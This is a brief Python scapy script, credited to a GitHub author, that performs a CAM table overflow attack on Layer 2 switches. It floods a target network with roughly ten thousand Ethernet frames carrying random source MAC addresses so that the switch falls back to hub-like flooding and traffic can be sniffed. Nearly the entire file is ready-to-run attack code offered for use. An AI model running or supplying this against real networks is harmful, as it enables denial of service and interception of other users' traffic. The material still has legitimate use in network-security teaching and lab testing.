#-------------------------------------------------------------------------------#
#     A script to perform CAM overflow attack on Layer 2 switches               #
#                   Bharath(github.com/yamakira)                                #
#                                                                               #
#     CAM Table Overflow is flooding a switche's CAM table                      #
#     with a lot of fake entries to drive the switch into HUB mode.             #
#  (Send thousands of Ether packets with random MAC addresses in each packet)   #
#-------------------------------------------------------------------------------#

#!/usr/bin/env python
from scapy.all import Ether, IP, TCP, RandIP, RandMAC, sendp, getmacbyip


'''Filling packet_list with ten thousand random Ethernet packets
   CAM overflow attacks need to be super fast.
   For that reason it's better to create a packet list before hand.
'''

def generate_packets():
    packet_list = []        #initializing packet_list to hold all the packets
    for i in range(1,10000):
        packet  = Ether(src = RandMAC(),dst=getmacbyip('192.168.1.1'))/IP(src=RandIP(), dst='192.168.1.1')
        packet_list.append(packet)
    return packet_list

def cam_overflow(packet_list):
    sendp(packet_list, iface='eth0')

if __name__ == '__main__':
    packet_list = generate_packets()
    cam_overflow(packet_list)
